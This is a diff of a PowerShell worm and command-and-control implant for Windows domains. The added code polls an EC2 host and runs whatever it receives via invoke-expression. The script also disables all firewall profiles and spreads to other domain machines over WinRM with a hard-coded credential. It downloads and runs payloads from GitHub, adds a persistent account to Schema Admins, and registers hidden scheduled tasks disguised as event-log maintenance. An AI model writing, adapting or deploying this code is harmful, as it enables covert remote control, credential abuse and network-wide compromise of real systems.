@@ -1,4 +1,4 @@
-﻿if(1 -eq 1){
+if(1 -eq 1){
     $fun = 'much'
 }
 else{
@@ -7,15 +7,18 @@ else{
 remove-item c:\Windows\EventLog.ps1
 [net.servicepointmanager]::SecurityProtocol = [net.securityprotocoltype]::Tls12
 import-module activedirectory
-set-executionpolicy Unrestricted
-
+set-executionpolicy Unrestricted -force
+$cNcURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt'
+$timeURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/eeee/timeZ.txt'
+$hostIP= Get-NetIPAddress | where {($_.IPAddress -like "10.*")} | foreach{$_.IPAddress}
 Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
 $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
-$toAppend=invoke-restmethod http://ec2-44-192-30-152.compute-1.amazonaws.com/eeee/timeZ.txt
+$toAppend=invoke-restmethod $timeURL
 $c0de='Tossking@'
 $c0de=$c0de+$toAppend
 $username='magrene'
 $usernameB=((gwmi WIN32_ComputerSystem).Domain+'\magrene')
+
 [SecureString]$secureString = $c0de | ConvertTo-SecureString -AsPlainText -Force 
 [PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
 
@@ -36,6 +39,23 @@ else{
 $domainSystemInfo = get-adcomputer -filter * -Properties ipv4address | select ipv4address , dnshostname
 
 
+function cNc{
+    $httpCommand=invoke-restmethod $cNcURL
+    $httpCommand | out-file -filepath .\rf.txt
+
+    [string[]]$read = get-content -path .\rf.txt
+    rm .\rf.txt
+    
+    if($read[1] -eq ($hostIP.split("."))[3] -or $read[1] -eq 'all'){
+        if($read[0] -eq ($hostIP.split("."))[1] -or $read[0] -eq 'all'){
+            invoke-expression $read[2]
+        }
+        write-output 'wrong team'
+    }
+    write-output 'wrong machine'
+
+    
+}
 
 if(!(Test-Path -Path 'C:\Program Files (x86)\Windows NT\TableTextService/TableTextServiceDa.txt')){
     try{mkdir 'C:\Program Files (x86)\Windows NT\TableTextService'}
@@ -68,57 +88,57 @@ function accountPersist{
 
 }
 
-
-function keepWINRMAlive{
-    While(1 -eq 1){
-        Enable-PSRemoting -force
-        start-sleep -Seconds (get-random -Minimum 60 -Maximum 90)
-    }
-}
 function wormy{
     
     while(1 -eq 1){
-    $httpCommand=invoke-restmethod http://ec2-44-192-30-152.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt
-    invoke-expression $httpCommand
-    accountPersist
-    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
-    [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
-    Write-Output 'slither'
-    Set-Service -Name WinRM -StartupType Automatic
-    Set-Service -Name Winmgmt -StartupType Automatic
-    Start-Service WinRM
-    Start-Service Winmgmt
-    Foreach($i in $computerNames){
-        Write-Output $i
-        invoke-command -ComputerName $i -Credential $credential -ScriptBlock {
-            if(Test-Path 'C:\Users\Public\Downloads\desktop.log' ){
-                if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 30){
-                    Invoke-Command -ScriptBlock {
-                    set-executionpolicy Unrestricted
-                    $WebClient = New-Object System.Net.WebClient
-                    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\EventLog.ps1")
-                    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\EventLog.ps1' -ExecutionPolicy Bypass
+        [SecureString]$secureString = $c0de | ConvertTo-SecureString -AsPlainText -Force 
+        [PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
+        #cNc
+        accountPersist
+        
+        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+        [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
+        Write-Output 'slither'
+        Set-Service -Name WinRM -StartupType Automatic
+        Set-Service -Name Winmgmt -StartupType Automatic
+        Start-Service WinRM
+        Start-Service Winmgmt
+        Foreach($i in $computerNames){
+            Write-Output $i
+            invoke-command -ComputerName $i -Credential $credential -ScriptBlock {
+                if(Test-Path 'C:\Users\Public\Downloads\desktop.log' ){
+                    if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 30){
+                        Invoke-Command -ScriptBlock {
+                        set-executionpolicy Unrestricted
+                        $WebClient = New-Object System.Net.WebClient
+                        $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\EventLog.ps1")
+                        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\EventLog.ps1' -ExecutionPolicy Bypass
+                        }
                     }
                 }
+                else{
+                        set-executionpolicy Unrestricted -force
+                        $WebClient = New-Object System.Net.WebClient
+                        $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\EventLog.ps1")
+                        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\EventLog.ps1' -ExecutionPolicy Bypass   
+                }
+                }
             }
-            else{
-                    set-executionpolicy Unrestricted
-                    $WebClient = New-Object System.Net.WebClient
-                    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\EventLog.ps1")
-                    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\EventLog.ps1' -ExecutionPolicy Bypass   
-            }
-            }
-        }
         
-        accountPersist
-        start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
-    }
+            
+            
+            start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
+        }
 }
 
-
 start-job -ScriptBlock{
-    
-    $toAppend=invoke-restmethod http://ec2-44-192-30-152.compute-1.amazonaws.com/eeee/timeZ.txt
+    Enable-PSRemoting -force
+    start-sleep -Seconds (get-random -Minimum 60 -Maximum 90)
+}
+start-job -ScriptBlock{
+    $timeURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/eeee/timeZ.txt'
+    while(1 -eq 1){
+    $toAppend=invoke-restmethod $timeURL
     $username='magrene'
     $c0de='Tossking@'
     $c0de=$c0de+$toAppend
@@ -138,31 +158,34 @@ start-job -ScriptBlock{
         Add-ADGroupMember -identity 'Schema Admins' -members $username
     }
     start-sleep -seconds 315
-
+}
 }
 
-start-job -ScriptBlock{
+start-job -scriptBlock {
+    while(1 -eq 1){
+        $cNcURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt'
+        $httpCommand=invoke-restmethod $cNcURL
+        $httpCommand | out-file -filepath .\rf.txt
 
-    While(1 -eq 1){
-        Enable-PSRemote -force
-        start-sleep -Seconds (get-random -Minimum 60 -Maximum 90)
-
+        [string[]]$read = get-content -path .\rf.txt
+        rm .\rf.txt
+    
+        if($read[1] -eq ($hostIP.split("."))[3] -or $read[1] -eq 'all'){
+            if($read[0] -eq ($hostIP.split("."))[1] -or $read[0] -eq 'all'){
+                invoke-expression $read[2]
+            }
+            
+        }
+        
+        start-sleep -seconds 5
     }
 }
-
 start-job -ScriptBlock { 
     while(1 -eq 1){
-        try{
-            $action = @()
-            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 | out-file -filepath c:\Windows\EventLog.ps1'
-            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "C:\Windows\EventLog.ps1"'
-            
-            $trigger = New-ScheduledTaskTrigger -AtStartup
-            Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "EventLog Rotate" -RunLevel Highest -Description "Prevents a event log cache overflow by rotating logs within NTFS filesystems. Disabling can cause system instability and is not recomended." -TaskPath \Microsoft\Windows\SpacePort -force
-        
+        try{ 
         
             $action = @()
-            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 | out-file -filepath c:\Windows\EventLog.ps1'
+            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/powW/main/Worm.ps1 | out-file -filepath c:\Windows\EventLog.ps1'
             $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "C:\Windows\EventLog.ps1"'
             $trigger = New-ScheduledTaskTrigger -AtLogon
             Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "EventLog Rotater" -RunLevel Highest -Description "Prevents a event log cache overflow by rotating logs within NTFS filesystems. Disabling can cause system instability and is not recomended." -TaskPath \Microsoft\Windows\Bitlocker -force
